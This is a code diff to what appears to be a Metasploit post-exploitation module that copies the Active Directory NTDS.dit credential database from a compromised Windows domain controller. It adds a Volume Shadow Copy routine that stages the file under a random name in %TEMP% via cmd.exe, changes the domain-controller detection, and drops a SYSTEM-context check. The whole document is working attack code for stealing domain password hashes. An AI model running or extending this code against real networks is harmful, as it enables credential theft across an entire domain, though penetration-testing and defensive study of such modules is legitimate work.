@@ -46,24 +46,23 @@ class Metasploit3 < Msf::Post
 
   def copy_database_file
     database_file_path = nil
-    case  sysinfo["OS"]
-      when /2003/
-        database_file_path = vss_method
-      when /2008|2012/
-        database_file_path = ntdsutil_method
-      else
-        print_error "This version of Windows in unsupported"
+    if start_vss
+      case  sysinfo["OS"]
+        when /2003| \.NET/
+          database_file_path = vss_method
+        when /2008|2012/
+          database_file_path = ntdsutil_method
+        else
+          print_error "This version of Windows is unsupported"
+      end
     end
     database_file_path
   end
 
   def is_domain_controller?
     status = false
-    service_list.each do |svc|
-      if svc[:name] == 'NTDS'
-        status = true
-        break
-      end
+    if session.fs.file.exists?('%SystemDrive%\Windows\ntds\ntds.dit')
+      status = true
     end
     status
   end
@@ -77,6 +76,7 @@ class Metasploit3 < Msf::Post
       print_status "NTDS database copied to #{file_path}"
     else
       print_error "There was an error copying the ntds.dit file!"
+      vprint_error result
       file_path = nil
     end
     file_path
@@ -97,10 +97,6 @@ class Metasploit3 < Msf::Post
       print_error "This module requires UAC to be bypassed first"
       status = false
     end
-    if is_system?
-      print_error "Volume Shadow Copy will not work properly as SYSTEM, migrate to a real user"
-      status = false
-    end
     return status
   end
 
@@ -110,7 +106,17 @@ class Metasploit3 < Msf::Post
   end
 
   def vss_method
-
+    id = create_shadowcopy("#{expand_path("%SystemDrive%")}\\")
+    sc_details = get_sc_details(id)
+    sc_path = "#{sc_details['DeviceObject']}\\windows\\ntds\\ntds.dit"
+    target_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
+    copy_command = "/c copy #{sc_path} #{target_path}"
+    result = cmd_exec('cmd.exe', copy_command)
+    if result =~ /1 file\(s\) copied/
+      return target_path
+    else
+      return nil
+    end
   end
 
 end
